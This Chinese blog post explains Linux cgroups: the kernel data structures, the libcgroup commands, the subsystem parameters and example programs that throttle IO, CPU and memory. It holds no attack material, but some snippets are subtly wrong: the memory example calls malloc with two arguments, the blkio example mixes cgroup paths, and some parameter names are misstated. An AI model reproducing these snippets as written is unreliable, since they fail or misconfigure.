<p>为什么要使用cg_cgroup_link结构体呢？<br>因为task与cgroup之间是多对多的关系。在数据库中,如果两张表是多对多的关系,那么如果不加入第三张关系表,就必须为一个字段的不同添加许多行记录,导致大量冗余。通过从主表和副表各拿一个主键新建一张关系表,可以提高数据查询的灵活性和效率。而一个task可能处于不同的cgroup,只要这些cgroup在不同的hierarchy中,并且每个hierarchy挂载的子系统不同:另一方面,一个cgroup中可以有多个task,这是显而易见的,但是这些task因为可能还存在在别的cgroup中,所以它们对应的css_set也不尽相同,所以一个cgroup也可以对应多个·css_set。在系统运行之初,内核的主函数就会对root cgroups和css_set进行初始化,每次task进行fork/exit时,都会附加（attach）/分离（detach）对应的css_set。综上所述,添加cg_cgroup_link主要是出于性能方面的考虑,一是节省了task_struct结构体占用的内存,二是提升了进程fork()/exit()的速度</p>
<p>当task从一个cgroup中移动到另一个时,它会得到一个新的css_set指针。如果所要加入的cgroup与现有的cgroup子系统相同,那么就重复使用现有的css_set,否则就分配一个新css_set。所有的css_set通过一个哈希表进行存放和查询,hlist_node hlist就指向了css_set_table这个hash表。同时,为了让cgroups便于用户理解和使用,也为了用精简的内核代码为cgroup提供熟悉的权限和命名空间管理,内核开发者们按照Linux 虚拟文件系统转换器（VFS：Virtual Filesystem Switch）的接口实现了一套名为cgroup的文件系统,非常巧妙地用来表示cgroups的hierarchy概念,把各个subsystem的实现都封装到文件系统的各项操作中。定义子系统的结构体是cgroup_subsys,cgroup_subsys中定义了一组函数的接口,让各个子系统自己去实现,类似的思想还被用在了cgroup_subsys_state中,cgroup_subsys_state并没有定义控制信息,只是定义了各个子系统都需要用到的公共信息,由各个子系统各自按需去定义自己的控制信息结构体,最终在自定义的结构体中把cgroup_subsys_state包含进去,然后内核通过container_of等宏定义来获取对应的结构体</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">struct cgroup_subsys &#123; </div><div class="line">struct cgroup_subsys_state *(*create)(struct cgroup_subsys *ss, </div><div class="line">struct cgroup *cgrp); </div><div class="line">int (*pre_destroy)(struct cgroup_subsys *ss, struct cgroup *cgrp); </div><div class="line">void (*destroy)(struct cgroup_subsys *ss, struct cgroup *cgrp); </div><div class="line">int (*can_attach)(struct cgroup_subsys *ss,</div><div class="line"> struct cgroup *cgrp, struct task_struct *tsk, bool threadgroup); </div><div class="line">void (*cancel_attach)(struct cgroup_subsys *ss, </div><div class="line">struct cgroup *cgrp, struct task_struct *tsk, bool threadgroup); </div><div class="line">void (*attach)(struct cgroup_subsys *ss, struct cgroup *cgrp, </div><div class="line">struct cgroup *old_cgrp, struct task_struct *tsk, bool threadgroup); </div><div class="line">void (*fork)(struct cgroup_subsys *ss, struct task_struct *task); </div><div class="line">void (*exit)(struct cgroup_subsys *ss, struct task_struct *task); </div><div class="line">int (*populate)(struct cgroup_subsys *ss, struct cgroup *cgrp); </div><div class="line">void (*post_clone)(struct cgroup_subsys *ss, struct cgroup *cgrp); </div><div class="line">void (*bind)(struct cgroup_subsys *ss, struct cgroup *root);</div><div class="line">int subsys_id; </div><div class="line">int active; </div><div class="line">int disabled; </div><div class="line">int early_init; </div><div class="line">bool use_id; </div><div class="line">#define MAX_CGROUP_TYPE_NAMELEN 32 </div><div class="line">const char *name; </div><div class="line">struct mutex hierarchy_mutex; </div><div class="line">struct lock_class_key subsys_key; </div><div class="line">struct cgroupfs_root *root; </div><div class="line">struct list_head sibling; </div><div class="line">struct idr idr; </div><div class="line">spinlock_t id_lock; </div><div class="line">struct module *module; </div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<ul>
<li>基于cgroups实现结构的用户层体现</li>
</ul>
<p>在实际使用时,需要通过挂载（mount）cgroup文件系统新建一个层级结构,挂载时指定要绑定的子系统,缺省情况下默认绑定系统所有子系统。把cgroup文件系统挂载（mount）上以后,你就可以像操作文件一样对cgroups的hierarchy层级进行浏览和操作管理,包括权限管理、子文件管理等等。除了cgroup文件系统以外,内核没有为cgroups的访问和操作添加任何系统调用。如果新建的层级结构要绑定的子系统与目前已经存在的层级结构完全相同,那么新的挂载会重用原来已经存在的那一套（指向相同的css_set）。否则如果要绑定的子系统已经被别的层级绑定,就会返回挂载失败的错误。如果一切顺利,挂载完成后层级就被激活并与相应子系统关联起来,可以开始使用了</p>
<p>目前无法将一个新的子系统绑定到激活的层级上,或者从一个激活的层级中解除某个子系统的绑定。<br>当一个顶层的cgroup文件系统被卸载（umount）时,如果其中创建后代cgroup目录,那么就算上层的cgroup被卸载了,层级也是激活状态,其后代cgoup中的配置依旧有效。只有递归式的卸载层级中的所有cgoup,那个层级才会被真正删除</p>
<p>层级激活后,/proc目录下的每个task PID文件夹下都会新添加一个名为cgroup的文件,列出task所在的层级,对其进行控制的子系统及对应cgroup文件系统的路径。<br>一个cgroup创建完成,不管绑定了何种子系统,其目录下都会生成以下几个文件,用来描述cgroup的相应信息。同样,把相应信息写入这些配置文件就可以生效,内容如下：<br>tasks：这个文件中罗列了所有在该cgroup中task的PID。该文件并不保证task的PID有序,把一个task的PID写到这个文件中就意味着把这个task加入这个cgroup中。<br>cgroup.procs：这个文件罗列所有在该cgroup中的线程组ID。该文件并不保证线程组ID有序和无重复。写一个线程组ID到这个文件就意味着把这个组中所有的线程加到这个cgroup中。<br>notify_on_release：填0或1,表示是否在cgroup中最后一个task退出时通知运行release agent,默认情况下是0,表示不运行。<br>release_agent：指定release agent执行脚本的文件路径,该文件在最顶层cgroup目录中存在,在这个脚本通常用于自动化umount无用的cgroup</p>
<p>除了上述几个通用的文件以外,绑定特定子系统的目录下也会有其他的文件进行子系统的参数配置。在创建的hierarchy中创建文件夹,就类似于fork中一个后代cgroup,后代cgroup中默认继承原有cgroup中的配置属性,但是你可以根据需求对配置参数进行调整。这样就把一个大的cgroup系统分割成一个个嵌套的、可动态变化的“软分区”</p>
<h4 id="cgroup的使用方法简介"><a href="#cgroup的使用方法简介" class="headerlink" title="cgroup的使用方法简介"></a><b>cgroup的使用方法简介</b></h4><ul>
<li><p>安装cgroups工具库<br>安装的过程会自动创建/cgroup目录,如果没有自动创建也不用担心,使用mkdir /cgroup 手动创建即可<br>安装完成后,你就可以使用lssubsys,默认的cgroup配置文件为/etc/cgconfig.conf,但是因为存在使LXC无法运行的bug,所以在新版本中把这个配置移除了</p>
</li>
<li><p>查询cgroup及子系统挂载状态<br>在挂载子系统之前,可能你要先检查下目前子系统的挂载状态,如果子系统已经挂载,你就无法把子系统挂载到新的hierarchy,此时就需要先删除相应hierarchy或卸载对应子系统后再挂载。<br>查看所有的cgroup：lscgroup<br>查看所有支持的子系统：lssubsys -a<br>查看所有子系统挂载的位置： lssubsys –m<br>查看单个子系统挂载位置：lssubsys –m memory（以memory为例）</p>
</li>
<li>创建hierarchy层级并挂载子系统<br>使用cgroup的最佳方式是为想要管理的每个或每组资源创建单独的cgroup层级结构。而创建hierarchy并不神秘,实际上就是做一个标记,通过挂载一个tmpfs文件系统,并给一个好的名字就可以了</li>
</ul>
<p>系统默认挂载的cgroup就会进行如下操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount -t tmpfs cgroups /sys/fs/cgroup</div></pre></td></tr></table></figure>
<p>挂载完成tmpfs后就可以通过mkdir命令创建相应的文件夹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mkdir /sys/fs/cgroup/cg1</div></pre></td></tr></table></figure></p>
<p>再把子系统挂载到相应层级上,挂载子系统也使用mount命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount -t cgroup -o subsystems name /cgroup/name</div></pre></td></tr></table></figure></p>
<p>name是层级名称。具体我们以挂载cpu和memory的子系统为例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount –t cgroup –o cpu,memory cpu_and_mem /sys/fs/cgroup/cg1</div></pre></td></tr></table></figure></p>
<p>从mount命令开始,-t后面跟的是挂载的文件系统类型,即cgroup文件系统。-o后面跟要挂载的子系统种类如cpu、memory,用逗号隔开,其后的cpu_and_mem不被cgroup代码的解释,但会出现在/proc/mounts里,可以使用任何有用的标识字符串。最后的参数则表示挂载点的目录位置</p>
<ul>
<li>卸载cgroup<br>cgroup文件系统虽然支持重新挂载,但是官方不建议使用,重新挂载虽然可以改变绑定的子系统和release agent,但是它要求对应的hierarchy是空的并且release_agent会被传统的fsnotify（内核默认的文件系统通知）代替,这就导致重新挂载很难生效。可以通过卸载,再挂载的方式处理这样的需求</li>
</ul>
<p>卸载cgroup非常简单,你可以通过cgdelete命令,也可以通过rmdir</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rmdir /sys/fs/cgroup/cg1</div></pre></td></tr></table></figure>
<p>rmdir执行成功的必要条件是cg1下层没有创建其它cgroup,cg1中没有添加任何task,并且它也没有被别的cgroup所引用。<br>cgdelete cpu,memory:/ 使用cgdelete命令可以递归的删除cgroup及其命令下的后代cgroup,并且如果cgroup中有task,那么task会自动移到上一层没有被删除的cgroup中,如果所有的cgroup都被删除了,那task就不被cgroups控制。但是一旦再次创建一个新的cgroup,所有进程都会被放进新的cgroup中</p>
<ul>
<li>设置cgroups参数<br>设置cgroups参数非常简单,直接对之前创建的cgroup对应文件夹下的文件写入即可。<br>设置task允许使用的cpu为0和1</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo 0-1 &gt; /sys/fs/cgroup/cg1/cpuset.cpus</div></pre></td></tr></table></figure>
<p>使用cgset命令也可以进行参数设置,对应上述允许使用0和1cpu</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cgset -r cpuset.cpus=0-1 cpu,memory:/</div></pre></td></tr></table></figure>
<ul>
<li>添加task到cgroup<br>通过文件操作进行添加<br>echo [PID] &gt; /path/to/cgroup/tasks<br>上述命令就是把进程ID打印到tasks中,如果tasks文件中已经有进程,需要使用”&gt;&gt;”向后添加。<br>通过cgclassify将进程添加到cgroup</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cgclassify -g subsystems:path_to_cgroup pidlist</div></pre></td></tr></table></figure>
<p>这个命令中,subsystems指的就是子系统(如果使用man命令查看,可能也会使用controllers表示)​​​,如果mount了多个,就是用”,”隔开的子系统名字作为名称,类似cgset命令。<br>通过cgexec直接在cgroup中启动并执行进程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cgexec -g subsystems:path_to_cgroup command arguments</div></pre></td></tr></table></figure>
<p>command和arguments就表示要在cgroup中执行的命令和参数<br>cgexec常用于执行临时的任务</p>
<ul>
<li>权限管理<br>与文件的权限管理类似,通过chown就可以对cgroup文件系统进行权限管理</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chown uid:gid /path/to/cgroup</div></pre></td></tr></table></figure>
<h4 id="subsystem的配置参数用法"><a href="#subsystem的配置参数用法" class="headerlink" title="subsystem的配置参数用法"></a><b>subsystem的配置参数用法</b></h4><ul>
<li>BLOCK IO资源控制<br>限额类。限额类是主要有两种策略,一种是基于完全公平队列调度（CFQ：Completely Fair Queuing）的按权重分配各个cgroup所能占用总体资源的百分比,好处是当资源空闲时可以充分利用,但只能用于最底层节点cgroup的配置；另一种则是设定资源使用上限,这种限额在各个层次的cgroup都可以配置,但这种限制较为生硬,并且容器之间依然会出现资源的竞争。<br>按比例分配块设备IO资源：<br>blkio.weight：填写100-1000的一个整数值,作为相对权重比率,作为通用的设备分配比。<br>blkio.weight_device：针对特定设备的权重比,写入格式为device_types:node_numbers weight,空格前的参数段指定设备,weight参数与blkio.weight相同并覆盖原有的通用分配比。查看一个设备的device_types:node_numbers可以使用：ls -l /dev/DEV,看到的用逗号分隔的两个数字就是。也称之为major_number:minor_number。<br>控制IO读写速度上限：<br>blkio.throttle.read_bps_device：按每秒读取块设备的数据量设定上限,格式device_types:node_numbers bytes_per_second。<br>blkio.throttle.write_bps_device：按每秒写入块设备的数据量设定上限,格式device_types:node_numbers bytes_per_second。<br>blkio.throttle.read_iops_device：按每秒读操作次数设定上限,格式device_types:node_numbers operations_per_second。<br>blkio.throttle.write_iops_device：按每秒写操作次数设定上限,格式device_types:node_numbers operations_per_second。<br>针对特定操作(read, write, sync, 或async)设定读写速度上限。<br>blkio.throttle.io_serviced：针对特定操作按每秒操作次数设定上限,格式device_types:node_numbers operation operations_per_second。<br>blkio.throttle.io_service_bytes：针对特定操作按每秒数据量设定上限,格式device_types:node_numbers operation bytes_per_second。<br>统计与监控。以下内容都是只读的状态报告,通过这些统计项更好地统计、监控进程的io情况。<br>blkio.reset_stats：重置统计信息,写入一个int值即可。<br>blkio.time：统计cgroup对设备的访问时间,按格式device_types:node_numbers milliseconds读取信息即可,以下类似。<br>blkio.io_serviced：统计cgroup对特定设备的IO操作,包括read、write、sync及async次数,格式device_types:node_numbers operation number。<br>blkio.sectors：统计cgroup对设备扇区访问次数,格式 device_types:node_numbers sector_count。<br>blkio.io_service_bytes：统计cgroup对特定设备IO操作,包括read、write、sync及async的数据量,格式device_types:node_numbers operation bytes。<br>blkio.io_queued：统计cgroup的队列中对IO操作,包括read、write、sync及async的请求次数,格式number operation。<br>blkio.io_service_time：统计cgroup对特定设备的IO操作,包括read、write、sync及async时间(单位为ns),格式device_types:node_numbers operation time。<br>blkio.io_merged：统计cgroup 将 BIOS 请求合并到IO操作,包括read、write、sync及async请求的次数,格式number operation。<br>blkio.io_wait_time：统计cgroup在各设​​​备​​​中各类型​​​IO操作,包括read、write、sync及async在队列中的等待时间​(单位ns),格式device_types:node<em>numbers operation time。<br><strong>blkio.</strong>recursive</em>*：各类型的统计都有一个递归版本,Docker中使用的都是这个版本。获取的数据与非递归版本是一样的,但是包括cgroup所有层级的监控数据</li>
</ul>
<p>我们的模拟命令如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo dd if=/dev/sda1 of=/dev/null</div></pre></td></tr></table></figure></p>
<p>通过iotop命令我们可以看到相关的IO速度是55MB/s(vm)<br>之后，我们先创建一个blkio（块设备IO）的cgroup，并把读IO限制到1MB/s，并把前面那个dd命令的pid放进去(注：8:0 是设备号，你可以通过ls -l /dev/sda1获得)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mkdir /sys/fs/cgroup/blkio/cg1</div><div class="line">echo &apos;8:0 1048576&apos;  &gt; /sys/fs/cgroup/blkio/cgl/blkio.throttle.read_bps_device</div><div class="line">echo 8128 &gt; /sys/fs/cgroup/blkio/haoel/tasks</div></pre></td></tr></table></figure></p>
<p>再用iotop命令，你马上就能看到读速度被限制到了1MB/s左右</p>
<ul>
<li>CPU资源控制<br>CPU资源的控制也有两种策略,一种是完全公平调度（CFS：Completely Fair Scheduler）策略,提供了限额和按比例分配两种方式进行资源控制；另一种是实时调度（Real-Time Scheduler）策略,针对实时进程按周期分配固定的运行时间。配置时间都以微秒（µs）为单位,文件名中用us表示。<br>CFS调度策略配置：<br>设定CPU使用周期使用时间上限。<br>cpu.cfs_period_us：设定周期时间,必须与cfs_quota_us配合使用。<br>cpu.cfs_quota_us：设定周期内最多可使用的时间。这里的配置指task对单个cpu的使用上限,若cfs_quota_us是cfs_period_us的两倍,就表示在两个核上完全使用。数值范围为1000-1000,000（微秒）。<br>cpu.stat：统计信息,包含nr_periods（表示经历了几个cfs_period_us周期）、nr_throttled（表示task被限制的次数）及throttled_time（表示task被限制的总时长）。<br>按权重比例设定CPU的分配。<br>cpu.shares：设定一个整数,必须大于等于2,表示相对权重,最后除以权重总和算出相对比例,按比例分配CPU时间。如cgroup A设置100,cgroup B设置300,那么cgroup A中的task运行25%的CPU时间。对于一个4核CPU的系统来说,cgroup A中的task可以100%占有某一个CPU,这个比例是相对整体的一个值。<br>RT调度策略下的配置：<br>实时调度策略与公平调度策略中的按周期分配时间的方法类似,也是在周期内分配一个固定的运行时间。<br>cpu.rt_period_us：设定周期时间。<br>cpu.rt_runtime_us：设定周期中的运行时间</li>
</ul>
<p>假设，我们有个非常耗cpu的程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    int i = 0;</div><div class="line">    for(;;) i++;</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>执行后，可以top看到进程pid为3529</p>
<p>在/sys/fs/cgroup/cpu下建立cg1的group<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">cat /sys/fs/cgroup/cpu/haoel/cpu.cfs_quota_us </div><div class="line">-1</div><div class="line">echo 20000 &gt; /sys/fs/cgroup/cpu/haoel/cpu.cfs_quota_us</div><div class="line"># 将进程的pid加入到cgroup中</div><div class="line">echo 3529 &gt;&gt; /sys/fs/cgroup/cpu/haoel/tasks</div></pre></td></tr></table></figure></p>
<p>之后，在top中看到cpu下降了20%</p>
<p>下边代码是一个线程示例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">#define _GNU_SOURCE         /* See feature_test_macros(7) */</div><div class="line"> </div><div class="line">#include &lt;pthread.h&gt;</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;sys/stat.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/syscall.h&gt;</div><div class="line"> </div><div class="line"> </div><div class="line">const int NUM_THREADS = 5;</div><div class="line"> </div><div class="line">void *thread_main(void *threadid)</div><div class="line">&#123;</div><div class="line">    /* 把自己加入cgroup中（syscall(SYS_gettid)为得到线程的系统tid） */</div><div class="line">    char cmd[128];</div><div class="line">    sprintf(cmd, &quot;echo %ld &gt;&gt; /sys/fs/cgroup/cpu/haoel/tasks&quot;, syscall(SYS_gettid));</div><div class="line">    system(cmd); </div><div class="line">    sprintf(cmd, &quot;echo %ld &gt;&gt; /sys/fs/cgroup/cpuset/haoel/tasks&quot;, syscall(SYS_gettid));</div><div class="line">    system(cmd);</div><div class="line"> </div><div class="line">    long tid;</div><div class="line">    tid = (long)threadid;</div><div class="line">    printf(&quot;Hello World! It&apos;s me, thread #%ld, pid #%ld!\n&quot;, tid, syscall(SYS_gettid));</div><div class="line">     </div><div class="line">    int a=0; </div><div class="line">    while(1) &#123;</div><div class="line">        a++;</div><div class="line">    &#125;</div><div class="line">    pthread_exit(NULL);</div><div class="line">&#125;</div><div class="line">int main (int argc, char *argv[])</div><div class="line">&#123;</div><div class="line">    int num_threads;</div><div class="line">    if (argc &gt; 1)&#123;</div><div class="line">        num_threads = atoi(argv[1]);</div><div class="line">    &#125;</div><div class="line">    if (num_threads&lt;=0 || num_threads&gt;=100)&#123;</div><div class="line">        num_threads = NUM_THREADS;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    /* 设置CPU利用率为50% */</div><div class="line">    mkdir(&quot;/sys/fs/cgroup/cpu/haoel&quot;, 755);</div><div class="line">    system(&quot;echo 50000 &gt; /sys/fs/cgroup/cpu/haoel/cpu.cfs_quota_us&quot;);</div><div class="line"> </div><div class="line">    mkdir(&quot;/sys/fs/cgroup/cpuset/haoel&quot;, 755);</div><div class="line">    /* 限制CPU只能使用#2核和#3核 */</div><div class="line">    system(&quot;echo \&quot;2,3\&quot; &gt; /sys/fs/cgroup/cpuset/haoel/cpuset.cpus&quot;);</div><div class="line"> </div><div class="line">    pthread_t* threads = (pthread_t*) malloc (sizeof(pthread_t)*num_threads);</div><div class="line">    int rc;</div><div class="line">    long t;</div><div class="line">    for(t=0; t&lt;num_threads; t++)&#123;</div><div class="line">        printf(&quot;In main: creating thread %ld\n&quot;, t);</div><div class="line">        rc = pthread_create(&amp;threads[t], NULL, thread_main, (void *)t);</div><div class="line">        if (rc)&#123;</div><div class="line">            printf(&quot;ERROR; return code from pthread_create() is %d\n&quot;, rc);</div><div class="line">            exit(-1);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"> </div><div class="line">    /* Last thing that main() should do */</div><div class="line">    pthread_exit(NULL);</div><div class="line">    free(threads);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li><p>cpu资源报告<br>这个子系统的配置是cpu子系统的补充,提供CPU资源用量的统计,时间单位都是纳秒。<br>cpuacct.usage：统计cgroup中所有task的cpu使用时长。<br>cpuacct.stat：统计cgroup中所有task的用户态和内核态分别使用cpu的时长。<br>cpuacct.usage_percpu：统计cgroup中所有task使用每个cpu的时长</p>
</li>
<li><p>cpu绑定<br>为task分配独立CPU资源的子系统,参数较多,这里只选讲两个必须配置的参数,同时Docker中目前也只用到这两个。<br>cpuset.cpus：在这个文件中填写cgroup可使用的CPU编号,如0-2,16代表 0、1、2和16这4个CPU。<br>cpuset.mems：与CPU类似,表示cgroup可使用的memory node</p>
</li>
<li><p>限制task对device的使用<br>设备黑/白名单过滤<br>devices.allow：允许名单,语法type device_types:node_numbers access type。<br>type有三种类型：b（块设备）、c（字符设备）、a（全部设备）<br>access也有三种方式：r（读）、w（写）、m（创建）<br>devices.deny：禁止名单,语法格式同上。<br>统计报告<br>devices.list：报告为这个cgroup中的task设定访问控制的设备</p>
</li>
<li><p>暂停/恢复cgroup中的task<br>只有一个属性,表示进程的状态,把task放到freezer所在的cgroup,再把state改为FROZEN,就可以暂停进程。不允许在cgroup处于FROZEN状态时加入进程。<br>freezer.state包括如下三种状态： -FROZEN 停止。-FREEZING 正在停止,这个是只读状态,不能写入这个值。-THAWED 恢复</p>
</li>
<li><p>内存资源管理</p>
</li>
</ul>
<p>限额类：<br>memory.limit_bytes：强制限制最大内存使用量,单位有k、m、g三种,填-1则代表无限制。<br>memory.soft_limit_bytes：软限制,只有比强制限制设置的值小时才有意义。当整体内存紧张的情况下,task获取的内存就被限制在软限制额度之内,以保证不会有太多进程因内存挨饿。可以看到,加入了内存的资源限制并不代表没有资源竞争。<br>memory.memsw.limit_bytes：设定最大内存与swap区内存之和的用量限制。<br>报警与自动控制：<br>memory.oom_control：改参数填0或1,0表示开启,当cgroup中的进程使用资源超过界限时立即杀死进程,1表示不启用。默认情况下,包含memory子系统的cgroup都启用。当oom_control不启用时,实际使用内存超过界限时进程会被暂停直到有空闲的内存资源。<br>统计与监控类：<br>memory.usage_bytes：报告该cgroups中进程使用的当前中总内存用量（以字节为单位）。<br>memory.max_usage_bytes：报告该cgroups中进程使用的最大内存使用量。<br>memory.failcnt：报告内存达到在memory.limit_in_bytes设定的限制值次数。<br>memory.stat：包含大量的内存统计数据。<br>cache：页缓存,包括​​tmpfs,单位为字节。<br>rss：匿名和swap,不包括tmpfs,单位为字节。​<br>mapped_file：memory-mapped映射的文件大小,包括tmpfs,单位为字节。<br>pgpgin：存入内存中的页数。<br>pgpgout：从内存中读出页数。<br>swap：swap用量,单位为字节。<br>active_anon：在活跃的最近最少使用（least-recently-used,LRU）列表中的匿名和swap缓存,包括tmpfs,单位为字节。<br>inactive_anon：不活跃的LRU列表中的匿名和swap缓存,包括tmpfs,单位为字节。<br>active_file：活跃LRU列表中的file-backed内存,以字节为单位。<br>inactive_file：不活跃LRU列表中的file-backed内存,以字节为单位。<br>unevictable：无法再生的内存,以字节为单位。<br>hierarchical_memory_limit：包含memory cgroup的层级的内存限制,单位为字节。<br>hierarchical_memsw_limit：包含memory cgroup的层级的内存加swap限制,单位为字节</p>
<p>下面是一个限制内存的示例(代码是个死循环，其它不断的分配内存，每次512个字节，每次休息一秒)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"> </div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    int size = 0;</div><div class="line">    int chunk_size = 512;</div><div class="line">    void *p = NULL;</div><div class="line"> </div><div class="line">    while(1) &#123;</div><div class="line"> </div><div class="line">        if ((p = malloc(p, chunk_size)) == NULL) &#123;</div><div class="line">            printf(&quot;out of memory!!\n&quot;);</div><div class="line">            break;</div><div class="line">        &#125;</div><div class="line">        memset(p, 1, chunk_size);</div><div class="line">        size += chunk_size;</div><div class="line">        printf(&quot;[%d] - memory is allocated [%8d] bytes \n&quot;, getpid(), size);</div><div class="line">        sleep(1);</div><div class="line">    &#125;</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>之后，我们在另一个终端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># 创建memory cgroup</div><div class="line">$ mkdir /sys/fs/cgroup/memory/haoel</div><div class="line">$ echo 64k &gt; /sys/fs/cgroup/memory/haoel/memory.limit_in_bytes</div><div class="line"> </div><div class="line"># 把上面的进程的pid加入这个cgroup</div><div class="line">$ echo [pid] &gt; /sys/fs/cgroup/memory/haoel/tasks</div></pre></td></tr></table></figure>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a><b>总结</b></h4><p>内核对cgroups的支持已经较为完善,但是依旧有许多工作需要完善。如网络方面目前是通过TC（Traffic Controller）来控制,未来需要统一整合；资源限制并没有解决资源竞争,在各自限制之内的进程依旧存在资源竞争,优先级调度方面依旧有很大的改进空间</p>
<p>ref</p>
<p><a href="http://70data.net/1131.html" target="_blank" rel="external">Docker学习笔记-Linux cgroups</a><br><a href="https://access.redhat.com/documentation/zh-CN/Red_Hat_Enterprise_Linux/6/html-single/Resource_Management_Guide/index.html" target="_blank" rel="external">Reahat Resource Management Guide</a><br><a href="http://coolshell.cn/articles/17049.html" target="_blank" rel="external">Docker基础技术：Linux CGroup</a></p>
<p>t1ger整理于2016.11.25</p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;cgroup是什么&quot;&gt;&lt;a href=&quot;#cgroup是什么&quot; class=&quot;headerlink&quot; title=&quot;cgroup是什么&quot;&gt;&lt;/a&gt;&lt;b&gt;cgroup是什么&lt;/b&gt;&lt;/h4&gt;&lt;p&gt;Linux CGroup全称Linux Control Group,L
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>配置中心那点事</title>
    <link href="https://t1ger.github.io/2016/11/23/%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83%E9%82%A3%E7%82%B9%E4%BA%8B/"/>
